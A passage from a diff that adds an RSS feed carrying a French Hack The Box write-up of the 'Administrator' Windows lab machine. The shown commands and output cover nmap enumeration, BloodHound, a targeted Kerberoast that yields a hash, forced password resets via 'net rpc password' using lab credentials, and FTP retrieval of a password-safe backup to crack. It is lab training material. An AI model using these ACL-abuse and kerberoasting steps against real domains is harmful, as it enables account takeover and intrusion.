@@ -1,0 +1,1027 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Windows on 01MI</title><link>https://01MI.github.io/fr/categories/windows/</link><description>Recent content in Windows on 01MI</description><generator>Hugo -- gohugo.io</generator><language>fr</language><lastBuildDate>Sat, 19 Apr 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://01MI.github.io/fr/categories/windows/index.xml" rel="self" type="application/rss+xml"/><item><title>Administrator - Windows Medium - HTB Writeup</title><link>https://01MI.github.io/fr/p/administrator-htb-writeup-windows-medium/</link><pubDate>Sat, 19 Apr 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/fr/p/administrator-htb-writeup-windows-medium/</guid><description>&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/Administrator.PNG" alt="Featured image of post Administrator - Windows Medium - HTB Writeup" />&lt;p>Si vous êtes familier avec les box windows, cette box est très simple car elle reprend des chemins d&amp;rsquo;exploitation classiques.&lt;/p>
+&lt;h2 id="résumé">Résumé
+&lt;/h2>&lt;p>User: ACL-based privileges&lt;br>
+Root: ACL-based privileges, DCsync&lt;/p>
+&lt;h2 id="enumeration">Enumeration
+&lt;/h2>&lt;p>A l’aide d’un scan nmap, nous pouvons identifier que cette machine est un contrôleur de domaine Active Directory.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="o">-&lt;/span> &lt;span class="mf">10.10.11.42&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">21&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ftp&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">53&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">domain&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">88&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">kerberos&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">sec&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">135&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">msrpc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">139&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">netbios&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ssn&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">389&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ldap&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">445&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">microsoft&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ds&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">464&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">kpasswd5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">593&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">rpc&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">epmap&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">636&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ldapssl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">3268&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">globalcatLDAP&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">3269&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">globalcatLDAPssl&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">5985&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">wsman&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">9389&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">adws&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">47001&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">winrm&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">49664&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">49665&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">49666&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">49667&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">49669&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">52649&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">59626&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">59631&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">59638&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">59643&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">59655&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">unknown&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>On utilise &lt;code>bloodhound-python&lt;/code> avec le compte fourni &lt;code>Olivia:ichliebedich&lt;/code> afin de récupérer des informations concernant le domaine &lt;code>administrator.htb&lt;/code> (qu&amp;rsquo;on ajoute à notre /etc/hosts).&lt;/p>
+&lt;p>Rapidement, nous identifions qu&amp;rsquo;il va falloir compromettre le compte d&amp;rsquo;Ethan pour DCSync et récupérer le hash du domain admin.
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/InitialBH.PNG"
+width="1526"
+height="653"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/InitialBH_hu_e2a3b127f0280991.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/InitialBH_hu_804dac06b69f8a86.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="233"
+data-flex-basis="560px"
+>&lt;/p>
+&lt;h2 id="user">User
+&lt;/h2>&lt;h3 id="genericwrite-olivia---michael">GenericWrite, Olivia -&amp;gt; Michael
+&lt;/h3>&lt;p>Afin de compromettre le compte d&amp;rsquo;Ethan, nous devons compromettre le compte d&amp;rsquo;Emily qui a les privilèges &lt;code>GenericWrite&lt;/code> sur le compte d&amp;rsquo;Ethan.
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoEthan.PNG"
+width="1251"
+height="688"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoEthan_hu_41cfd9c225264ae1.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoEthan_hu_66b96f6c906e5f70.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="181"
+data-flex-basis="436px"
+>
+Comme on peut le voir il n&amp;rsquo;y a pas de chemin direct vers Emily depuis le compte de Olivia.
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoEmily.PNG"
+width="1277"
+height="672"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoEmily_hu_d2a3848a42151f27.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoEmily_hu_adaeb96cf836acb9.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="190"
+data-flex-basis="456px"
+>&lt;/p>
+&lt;p>On va se concentrer sur les accès qu&amp;rsquo;à notre user initial Olivia.&lt;br>
+Elle a les privilèges &lt;code>GenericAll&lt;/code> sur Michael, on va donc procéder à une attaque ciblée kerberoast afin de récupérer son hash.&lt;br>
+Le hash ne pouvant pas être cracké, on va utiliser les privilèges d&amp;rsquo;Olivia pour forcer le changement du mot de passe de Michael.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
+&lt;/span>&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">9
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">targetedKerberoast&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">d&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">u&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">olivia&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">ichliebedich&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Starting&lt;/span> &lt;span class="nx">kerberoast&lt;/span> &lt;span class="nx">attacks&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Fetching&lt;/span> &lt;span class="nx">usernames&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">Active&lt;/span> &lt;span class="nx">Directory&lt;/span> &lt;span class="nx">with&lt;/span> &lt;span class="nx">LDAP&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">VERBOSE&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">SPN&lt;/span> &lt;span class="nx">added&lt;/span> &lt;span class="nx">successfully&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">michael&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">Printing&lt;/span> &lt;span class="nx">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">michael&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span>&lt;span class="nx">krb5tgs&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">michael&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">ADMINISTRATOR&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HTB&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">michael&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="nx">da&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="nx">d&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">VERBOSE&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">SPN&lt;/span> &lt;span class="nx">removed&lt;/span> &lt;span class="nx">successfully&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">michael&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">net&lt;/span> &lt;span class="nx">rpc&lt;/span> &lt;span class="nx">password&lt;/span> &lt;span class="s">&amp;#34;michael&amp;#34;&lt;/span> &lt;span class="s">&amp;#34;michael_pass&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">U&lt;/span> &lt;span class="s">&amp;#34;administrator.htb&amp;#34;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="s">&amp;#34;olivia&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="s">&amp;#34;ichliebedich&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span> &lt;span class="s">&amp;#34;administrator.htb&amp;#34;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;h3 id="forcechangepassword-michael---benjamin">ForceChangePassword, Michael -&amp;gt; Benjamin
+&lt;/h3>&lt;p>En continuant notre énumération sur BH, on remarque que Michael peut changer le mot de passe de Benjamin.&lt;br>
+On utilise la même commande précédemment utilisée pour ce changement.
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoBenjamin.PNG"
+width="1169"
+height="160"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoBenjamin_hu_ad9615a69bc5d91d.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/PathtoBenjamin_hu_8a019130d57fce90.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="730"
+data-flex-basis="1753px"
+>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">net&lt;/span> &lt;span class="nx">rpc&lt;/span> &lt;span class="nx">password&lt;/span> &lt;span class="s">&amp;#34;benjamin&amp;#34;&lt;/span> &lt;span class="s">&amp;#34;benjamin_pass&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">U&lt;/span> &lt;span class="s">&amp;#34;administrator.htb&amp;#34;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="s">&amp;#34;michael&amp;#34;&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="s">&amp;#34;michael_pass&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span> &lt;span class="s">&amp;#34;administrator.htb&amp;#34;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/p>
+&lt;p>Benjamin fait partie du groupe &lt;code>SHARE MODERATORS&lt;/code>.
+&lt;img src="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/BenjaminGroup.PNG"
+width="1129"
+height="212"
+srcset="https://01MI.github.io/p/administrator-htb-writeup-windows-medium/BenjaminGroup_hu_80f940a7f7e25a4c.PNG 480w, https://01MI.github.io/p/administrator-htb-writeup-windows-medium/BenjaminGroup_hu_e6e96facd65cc825.PNG 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="532"
+data-flex-basis="1278px"
+>
+On ne découvre rien d&amp;rsquo;intéressant sur les shares SMB mais, sur le FTP on trouve &lt;code>Backup.psafe3&lt;/code> que l&amp;rsquo;on récupère et dont on crack le mot de passe avec hashcat.&lt;/p>
+&lt;h3 id="ftp-et-backuppsafe3">FTP et Backup.psafe3
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 6
+&lt;/span>&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 8
+&lt;/span>&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">18
+&lt;/span>&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">32
+&lt;/span>&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ftp&lt;/span> &lt;span class="nx">benjamin&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.42&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ftp&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">229&lt;/span> &lt;span class="nx">Entering&lt;/span> &lt;span class="nx">Extended&lt;/span> &lt;span class="nx">Passive&lt;/span> &lt;span class="nf">Mode&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">50350&lt;/span>&lt;span class="p">|)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">125&lt;/span> &lt;span class="nx">Data&lt;/span> &lt;span class="nx">connection&lt;/span> &lt;span class="nx">already&lt;/span> &lt;span class="nx">open&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">Transfer&lt;/span> &lt;span class="nx">starting&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">10&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">05&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">24&lt;/span> &lt;span class="mi">09&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="nx">AM&lt;/span> &lt;span class="mi">952&lt;/span> &lt;span class="nx">Backup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">psafe3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">226&lt;/span> &lt;span class="nx">Transfer&lt;/span> &lt;span class="nx">complete&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ftp&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">mget&lt;/span> &lt;span class="nx">backup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">psafe3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">mget&lt;/span> &lt;span class="nx">Backup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">psafe3&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nx">anpqy&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="err">?&lt;/span> &lt;span class="nx">yes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">229&lt;/span> &lt;span class="nx">Entering&lt;/span> &lt;span class="nx">Extended&lt;/span> &lt;span class="nx">Passive&lt;/span> &lt;span class="nf">Mode&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">50354&lt;/span>&lt;span class="p">|)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">125&lt;/span> &lt;span class="nx">Data&lt;/span> &lt;span class="nx">connection&lt;/span> &lt;span class="nx">already&lt;/span> &lt;span class="nx">open&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">Transfer&lt;/span> &lt;span class="nx">starting&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">100&lt;/span>&lt;span class="o">%&lt;/span> &lt;span class="p">|&lt;/span>&lt;span class="o">*******************************************************************************************&lt;/span>&lt;span class="p">|&lt;/span> &lt;span class="mi">952&lt;/span> &lt;span class="mf">56.85&lt;/span> &lt;span class="nx">KiB&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mo">00&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">00&lt;/span> &lt;span class="nx">ETA&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">226&lt;/span> &lt;span class="nx">Transfer&lt;/span> &lt;span class="nx">complete&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ftp&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nx">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">221&lt;/span> &lt;span class="nx">Goodbye&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
